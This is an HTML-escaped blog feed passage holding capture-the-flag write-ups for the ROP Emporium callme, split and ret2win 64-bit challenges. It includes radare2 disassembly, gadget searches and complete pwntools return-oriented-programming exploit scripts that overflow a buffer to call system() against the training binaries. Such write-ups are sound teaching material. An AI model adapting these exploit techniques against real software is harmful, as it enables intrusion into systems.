0x000000000040093e: pop rdx; ret;
0x00000000004009a1: pop rsi; pop r15; ret;
0x000000000040093d: pop rsi; pop rdx; ret;
0x000000000040099d: pop rsp; pop r13; pop r14; pop r15; ret;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>we have a gadget that satisfies our exact need lets take a note of it &lt;code>0x000000000040093c&lt;/code>&lt;/p>
&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;p>Now lets craft our exploit :)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
gadget &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040093c&lt;/span> &lt;span style="color:#75715e">#pop rdi; pop rsi; pop rdx; ret&lt;/span>
one &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>
two &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xcafebabecafebabe&lt;/span>
three &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xd00df00dd00df00d&lt;/span>
payload &lt;span style="color:#f92672">=&lt;/span> flat([
cyclic(&lt;span style="color:#ae81ff">40&lt;/span>),
gadget, one, two, three, exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;callme_one&amp;#39;&lt;/span>],
gadget, one, two, three, exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;callme_two&amp;#39;&lt;/span>],
gadget, one, two, three, exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;callme_three&amp;#39;&lt;/span>]
])
io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
io&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets run our exploit to check if it works&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">callme64 ➤ python xpl.py
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">8013&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
callme by ROP Emporium
x86_64
Hope you read the instructions...
&amp;gt; Thank you!
callme_one&lt;span style="color:#f92672">()&lt;/span> called correctly
callme_two&lt;span style="color:#f92672">()&lt;/span> called correctly
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Process &lt;span style="color:#e6db74">&amp;#39;./callme&amp;#39;&lt;/span> stopped with exit code &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">(&lt;/span>pid 8013&lt;span style="color:#f92672">)&lt;/span>
ROPE&lt;span style="color:#f92672">{&lt;/span>a_placeholder_32byte_flag!&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Got EOF &lt;span style="color:#66d9ef">while&lt;/span> reading in interactive
$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Yea our exploit works fine as expected :)&lt;/p></content></item><item><title>Ropemporium split 64bit</title><link>/posts/ropemporium-split-64bit/</link><pubDate>Sat, 05 Sep 2020 00:00:00 +0000</pubDate><guid>/posts/ropemporium-split-64bit/</guid><description>Challenge description &amp;gt; In this challenge the elements that allowed you to complete the ret2win challenge are still present, they&amp;rsquo;ve just been split apart. Find them and recombine them using a short ROP chain.
The binary can be found here ~&amp;gt; split
This challenge is slighty different from the previous challenge as the description says all elements are still present they&amp;rsquo;ve just been split apart so we&amp;rsquo;ll recombine them now :)</description><content>&lt;h2 id="challenge-description-">Challenge description &amp;gt;&lt;/h2>
&lt;p>In this challenge the elements that allowed you to complete the ret2win challenge are still present, they&amp;rsquo;ve just been split apart. Find them and recombine them using a short ROP chain.&lt;/p>
&lt;p>The binary can be found here ~&amp;gt;
&lt;a href="https://ropemporium.com/challenge/split.html">split&lt;/a>&lt;/p>
&lt;p>This challenge is slighty different from the previous challenge as the description says all elements are still present they&amp;rsquo;ve just been split apart so we&amp;rsquo;ll recombine them now :)&lt;/p>
&lt;p>lets check the binary&amp;rsquo;s mitigation and from the previous challenge we know we need 40 bytes to overflow .&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ checksec split
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/1-split/split64/split&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This looks similar to ret2win and we see nx is enabled so we cant use shellcode to spawn a shell.
So for this challenge the two elements that we need are a &lt;code>/bin/cat flag.txt&lt;/code> and call to &lt;code>system() function&lt;/code>&lt;/p>
&lt;p>Let&amp;rsquo;s check out the if the cat flag string is present in the binary&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ rabin2 -z split
&lt;span style="color:#f92672">[&lt;/span>Strings&lt;span style="color:#f92672">]&lt;/span>
nth paddr vaddr len size section type string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
&lt;span style="color:#ae81ff">0&lt;/span> 0x000007e8 0x004007e8 &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span> .rodata ascii split by ROP Emporium
&lt;span style="color:#ae81ff">1&lt;/span> 0x000007fe 0x004007fe &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> .rodata ascii x86_64&lt;span style="color:#ae81ff">\n&lt;/span>
&lt;span style="color:#ae81ff">2&lt;/span> 0x00000806 0x00400806 &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> .rodata ascii &lt;span style="color:#ae81ff">\n&lt;/span>Exiting
&lt;span style="color:#ae81ff">3&lt;/span> 0x00000810 0x00400810 &lt;span style="color:#ae81ff">43&lt;/span> &lt;span style="color:#ae81ff">44&lt;/span> .rodata ascii Contriving a reason to ask user &lt;span style="color:#66d9ef">for&lt;/span> data...
&lt;span style="color:#ae81ff">4&lt;/span> 0x0000083f 0x0040083f &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> .rodata ascii Thank you!
&lt;span style="color:#ae81ff">5&lt;/span> 0x0000084a 0x0040084a &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> .rodata ascii /bin/ls
&lt;span style="color:#ae81ff">0&lt;/span> 0x00001060 0x00601060 &lt;span style="color:#ae81ff">17&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span> .data ascii /bin/cat flag.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Yes we can see our cat flag string present,
the addr of our cat flag string is &lt;code>0x00601060&lt;/code>&lt;/p>
&lt;p>Next up we need our system function lets look at some funcitons using radare2.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
0x004005b0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> entry0
0x004005f0 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">37&lt;/span> sym.deregister_tm_clones
0x00400620 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">55&lt;/span> sym.register_tm_clones
0x00400660 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">34&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">29&lt;/span> sym.__do_global_dtors_aux
0x00400690 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> entry.init0
0x004006e8 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">90&lt;/span> sym.pwnme
0x00400580 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.memset
0x00400550 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.puts
0x00400570 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.printf
0x00400590 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.read
0x00400742 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">17&lt;/span> sym.usefulFunction
0x00400560 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.system
0x004007d0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> sym.__libc_csu_fini
0x004007d4 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> sym._fini
0x00400760 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">101&lt;/span> sym.__libc_csu_init
0x004005e0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> sym._dl_relocate_static_pie
0x00400697 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">81&lt;/span> main
0x004005a0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
0x00400528 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Everything seems normal but we can see there&amp;rsquo;s a useful function lets take a look at it&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
&lt;span style="color:#f92672">[&lt;/span>0x00400742&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
┌ 17: sym.usefulFunction &lt;span style="color:#f92672">()&lt;/span>;
│ 0x00400742 push rbp
│ 0x00400743 mov rbp, rsp
│ 0x00400746 mov edi, str.bin_ls ; 0x40084a ; &lt;span style="color:#e6db74">&amp;#34;/bin/ls&amp;#34;&lt;/span> ; const char *string
│ 0x0040074b call sym.imp.system ; int system&lt;span style="color:#f92672">(&lt;/span>const char *string&lt;span style="color:#f92672">)&lt;/span>
│ 0x00400750 nop
│ 0x00400751 pop rbp
└ 0x00400752 ret
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The useful function just does list&amp;rsquo;s the files in the dir but whats useful for us here is the system call
let&amp;rsquo;s take a note at the address of it &lt;code>0x0040074b&lt;/code>.
Great we&amp;rsquo;ve found the two elements now we just need to find the right gadget.
But what gadget are we looking for, we&amp;rsquo;re looking for a pop rdi gadget so we can store the string into rdi register and call system so we can cat out flag .&lt;/p>
&lt;p>Now we&amp;rsquo;ll use ropper to find the gagdget.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
split64 ➤ ropper --file split --search &lt;span style="color:#e6db74">&amp;#34;pop rdi&amp;#34;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Load gadgets from cache
&lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> loading... 100%
&lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> removing double gadgets... 100%
&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Searching &lt;span style="color:#66d9ef">for&lt;/span> gadgets: pop rdi
&lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> File: split
0x00000000004007c3: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;p>Combining what we&amp;rsquo;re gonna do.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
gadget
cat_flag string
call_system by returning into it
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
io &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#34;./split&amp;#34;&lt;/span>)
padding &lt;span style="color:#f92672">=&lt;/span> cyclic(&lt;span style="color:#ae81ff">40&lt;/span>) &lt;span style="color:#75715e"># 40 bytes to overflow&lt;/span>
gadget &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x00000000004007c3&lt;/span>)
cat_flag &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x00601060&lt;/span>)
system &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x0040074b&lt;/span>)
payload &lt;span style="color:#f92672">=&lt;/span> padding
payload &lt;span style="color:#f92672">+=&lt;/span> gadget &lt;span style="color:#f92672">+&lt;/span> cat_flag &lt;span style="color:#f92672">+&lt;/span> system
io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
io&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s run the exploit to check if it works&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ python xpl.py
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;./split&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">15817&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
split by ROP Emporium
x86_64
Contriving a reason to ask user &lt;span style="color:#66d9ef">for&lt;/span> data...
&amp;gt; Thank you!
ROPE&lt;span style="color:#f92672">{&lt;/span>a_placeholder_32byte_flag!&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Got EOF &lt;span style="color:#66d9ef">while&lt;/span> reading in interactive
$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Yea our exploit works and we grabbed the flag :)&lt;/p></content></item><item><title>Ropemporium ret2win 64bit</title><link>/posts/ropemporium-ret2win-64bit/</link><pubDate>Thu, 27 Aug 2020 00:00:00 +0000</pubDate><guid>/posts/ropemporium-ret2win-64bit/</guid><description>What is return oriented programming ? Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.
In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine&amp;rsquo;s memory, called &amp;ldquo;gadgets&amp;rdquo;. Each gadget typically ends in a return instruction and is located in a subroutine within the existing program and/or shared library code.</description><content>&lt;h2 id="what-is-return-oriented-programming-">What is return oriented programming ?&lt;/h2>
&lt;p>Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.&lt;/p>
&lt;p>In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine&amp;rsquo;s memory, called &amp;ldquo;gadgets&amp;rdquo;. Each gadget typically ends in a return instruction and is located in a subroutine within the existing program and/or shared library code. Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks.&lt;/p>
&lt;h2 id="the-tools-i-use">The tools i use&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">pwntools
pwndbg&lt;span style="color:#f92672">/&lt;/span>gef
ropper&lt;span style="color:#f92672">/&lt;/span>ROPgadget
radare2
vim&lt;span style="color:#f92672">/&lt;/span>emacs&lt;span style="color:#f92672">-&lt;/span>doom&lt;span style="color:#f92672">/&lt;/span>sublime(favorite&lt;span style="color:#f92672">-&lt;/span>text&lt;span style="color:#f92672">-&lt;/span>editors)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The binary and challenge description can be found here
&lt;a href="https://ropemporium.com/challenge/ret2win.html">ret2win&lt;/a>&lt;/p>
&lt;p>Lets run the binary and see what happens!&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-terminal" data-lang="terminal">ret2win64 ➤ ./ret2win
ret2win by ROP Emporium
x86_64
For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!
&amp;gt; jojijojoknkjg
Thank you!
Exiting
ret2win64 ➤
&lt;/code>&lt;/pre>&lt;h2 id="mitigations-in-binaries">Mitigations in binaries&lt;/h2>
&lt;p>let&amp;rsquo;s checkout the binary mitigations first&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-terminal" data-lang="terminal">ret2win64 ➤ checksec ret2win
[*] '/home/h4x5p4c3/Documents/pwn/rop_emporium/0-ret2win/ret2win64/ret2win'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Canary is simple and efficient in both implementation and design. It is to insert a value. At the end of the high-risk area where stack overflow occurs, when the function returns, check if the value of canary has been changed to determine whether stack/buffer overflow occurs.
In this case canary is disable as you can see.&lt;/p>
&lt;p>PIE randomizes Code segment base address
PIE randomizes GOT/PLT base address
but PIE is disabled in this binary. so the addresses in the binary wont change.&lt;/p>
&lt;p>And NX is enabled so we cant use shellcode to spawn a shell.&lt;/p>
&lt;p>so what&amp;rsquo;s Relocation Read-Only (or RELRO) is a security measure which makes some binary sections read-only.
There are two RELRO &amp;ldquo;modes&amp;rdquo;: partial and full&lt;/p>
&lt;p>To checkout binary mitigations in depth
check this article
&lt;img src="https://ctf101.org/binary-exploitation/what-is-binary-security/" alt="binary-mitigation">&lt;/p>
&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;p>Now lets checkout the functions and disassembly using radare2&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ r2 -AAA ret2win
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze all flags starting with sym. and entry0 &lt;span style="color:#f92672">(&lt;/span>aa&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze &lt;span style="color:#66d9ef">function&lt;/span> calls &lt;span style="color:#f92672">(&lt;/span>aac&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze len bytes of instructions &lt;span style="color:#66d9ef">for&lt;/span> references &lt;span style="color:#f92672">(&lt;/span>aar&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Check &lt;span style="color:#66d9ef">for&lt;/span> vtables
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Type matching analysis &lt;span style="color:#66d9ef">for&lt;/span> all functions &lt;span style="color:#f92672">(&lt;/span>aaft&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Propagate noreturn information
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Use -AA or aaaa to perform additional experimental analysis.
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Finding &lt;span style="color:#66d9ef">function&lt;/span> preludes
&lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Enable constraint types analysis &lt;span style="color:#66d9ef">for&lt;/span> variables
-- No such file or directory.
&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
0x004005b0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> entry0
0x004005f0 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">37&lt;/span> sym.deregister_tm_clones
0x00400620 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">55&lt;/span> sym.register_tm_clones
0x00400660 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">34&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">29&lt;/span> sym.__do_global_dtors_aux
0x00400690 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> entry.init0
0x004006e8 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">110&lt;/span> sym.pwnme
0x00400580 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.memset
0x00400550 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.puts
0x00400570 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.printf
0x00400590 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.read
0x00400756 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">27&lt;/span> sym.ret2win
0x00400560 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.system
0x004007f0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> sym.__libc_csu_fini
0x004007f4 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> sym._fini
0x00400780 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">101&lt;/span> sym.__libc_csu_init
0x004005e0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> sym._dl_relocate_static_pie
0x00400697 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">81&lt;/span> main
0x004005a0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
0x00400528 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now lets take a look at he main function to see what happens in there&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s main
&lt;span style="color:#f92672">[&lt;/span>0x00400697&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
; DATA XREF from entry0 @ 0x4005cd
┌ 81: int main &lt;span style="color:#f92672">(&lt;/span>int argc, char **argv, char **envp&lt;span style="color:#f92672">)&lt;/span>;
│ 0x00400697 &lt;span style="color:#ae81ff">55&lt;/span> push rbp
│ 0x00400698 4889e5 mov rbp, rsp
│ 0x0040069b 488b05b60920. mov rax, qword &lt;span style="color:#f92672">[&lt;/span>obj.stdout&lt;span style="color:#f92672">]&lt;/span> ; obj.__TMC_END
│ ; &lt;span style="color:#f92672">[&lt;/span>0x601058:8&lt;span style="color:#f92672">]=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
│ 0x004006a2 b900000000 mov ecx, &lt;span style="color:#ae81ff">0&lt;/span> ; size_t size
│ 0x004006a7 ba02000000 mov edx, &lt;span style="color:#ae81ff">2&lt;/span> ; int mode
│ 0x004006ac be00000000 mov esi, &lt;span style="color:#ae81ff">0&lt;/span> ; char *buf
│ 0x004006b1 4889c7 mov rdi, rax ; FILE*stream
│ 0x004006b4 e8e7feffff call sym.imp.setvbuf ; int setvbuf&lt;span style="color:#f92672">(&lt;/span>FILE*stream, char *buf, int mode, size_t size&lt;span style="color:#f92672">)&lt;/span>
│ 0x004006b9 bf08084000 mov edi, str.ret2win_by_ROP_Emporium ; 0x400808 ; &lt;span style="color:#e6db74">&amp;#34;ret2win by ROP Emporium&amp;#34;&lt;/span> ; const char *s
│ 0x004006be e88dfeffff call sym.imp.puts ; int puts&lt;span style="color:#f92672">(&lt;/span>const char *s&lt;span style="color:#f92672">)&lt;/span>
│ 0x004006c3 bf20084000 mov edi, str.x86_64 ; 0x400820 ; &lt;span style="color:#e6db74">&amp;#34;x86_64\n&amp;#34;&lt;/span> ; const char *s
│ 0x004006c8 e883feffff call sym.imp.puts ; int puts&lt;span style="color:#f92672">(&lt;/span>const char *s&lt;span style="color:#f92672">)&lt;/span>
│ 0x004006cd b800000000 mov eax, &lt;span style="color:#ae81ff">0&lt;/span>
│ 0x004006d2 e811000000 call sym.pwnme
│ 0x004006d7 bf28084000 mov edi, str.Exiting ; 0x400828 ; &lt;span style="color:#e6db74">&amp;#34;\nExiting&amp;#34;&lt;/span> ; const char *s
│ 0x004006dc e86ffeffff call sym.imp.puts ; int puts&lt;span style="color:#f92672">(&lt;/span>const char *s&lt;span style="color:#f92672">)&lt;/span>
│ 0x004006e1 b800000000 mov eax, &lt;span style="color:#ae81ff">0&lt;/span>
│ 0x004006e6 5d pop rbp
└ 0x004006e7 c3 ret
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The main function just prints the output we saw when we ran the binary and its calls a function named pwnme
we know the pwnme function contains the vulnerable gets fucntions which we need to overflow&lt;/p>
&lt;p>let&amp;rsquo;s checkout ret2win fucntion to see what it does&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400756&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
┌ 27: sym.ret2win &lt;span style="color:#f92672">()&lt;/span>;
│ 0x00400756 &lt;span style="color:#ae81ff">55&lt;/span> push rbp
│ 0x00400757 4889e5 mov rbp, rsp
